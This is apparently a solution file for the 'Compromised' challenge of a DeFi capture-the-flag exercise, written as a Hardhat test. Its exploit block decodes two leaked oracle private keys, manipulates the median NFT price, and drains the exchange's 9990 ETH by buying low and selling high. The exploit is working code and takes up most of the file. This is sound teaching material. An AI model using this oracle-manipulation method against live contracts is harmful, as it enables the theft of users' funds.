const { expect } = require('chai');
const { fromUtf8, toUtf8 } = require('ethjs-util');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        // get 2 pk from http responses
        let info = '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35';
        info = Buffer.from(toUtf8(info.split(' ').join('')), 'base64');
        let pk = info.toString();
        const signer1 = new ethers.Wallet(pk, ethers.provider);
        // console.log('addr1:', signer1.address);

        info = '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34';
        info = Buffer.from(toUtf8(info.split(' ').join('')), 'base64');
        pk = info.toString();
        const signer2 = new ethers.Wallet(pk, ethers.provider);
        // console.log('addr2:', signer2.address);

        // 1 pk set price and sent 1.5 ether to another pk
        const pz1price = ethers.utils.parseEther('0.01');
        let tx = await this.oracle.connect(signer1).postPrice('DVNFT', pz1price);
        await tx.wait();

        tx = await signer1.sendTransaction({ to: signer2.address, value: ethers.utils.parseEther('1.6') });
        await tx.wait();
        // console.log('s2-balance:', String(await signer2.getBalance()));

        tx = await this.oracle.connect(signer2).postPrice('DVNFT', pz1price);
        await tx.wait();
        // console.log('price:', ethers.utils.formatUnits(await this.oracle.getMedianPrice('DVNFT')));

        const iface = this.exchange.interface;
        const tbTopic = iface.getEventTopic('TokenBought');
        let ntf_ids = Array();

        // buy 20 nft
        for (let i = 0; i < 20; i++) {
            tx = await this.exchange.connect(signer2).buyOne({ value: pz1price });
            const recp = await tx.wait();
            for (let j = 0; j < recp.logs.length; j++) {
                if (recp.logs[j].topics[0] == tbTopic) {
                    const res = iface.decodeEventLog('TokenBought', recp.logs[j].data);
                    ntf_ids.push(res.tokenId);
                    // also approve to exchange to sell
                    tx = await this.nftToken.connect(signer2).approve(this.exchange.address, res.tokenId);
                    await tx.wait();
                    break;
                }
            }
        }
        // console.log('ntf-ids:', ntf_ids);

        tx = await this.oracle.connect(signer2).postPrice('DVNFT', pz1price.mul(2));
        await tx.wait();
        // console.log('price:', ethers.utils.formatUnits(await this.oracle.getMedianPrice('DVNFT')));

        // sell 10 at 0.02 and 10 at 999 to empty the exchange
        for (let i = 0; i < 10; i++) {
            tx = await this.exchange.connect(signer2).sellOne(ntf_ids.pop());
            await tx.wait();
        }
        tx = await this.oracle.connect(signer2).postPrice('DVNFT', INITIAL_NFT_PRICE);
        await tx.wait();
        for (let i = 0; i < 10; i++) {
            tx = await this.exchange.connect(signer2).sellOne(ntf_ids.pop());
            await tx.wait();
        }

        // send EXCHANGE_INITIAL_ETH_BALANCE to the attacker
        tx = await signer2.sendTransaction({ to: attacker.address, value: EXCHANGE_INITIAL_ETH_BALANCE });
        await tx.wait();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
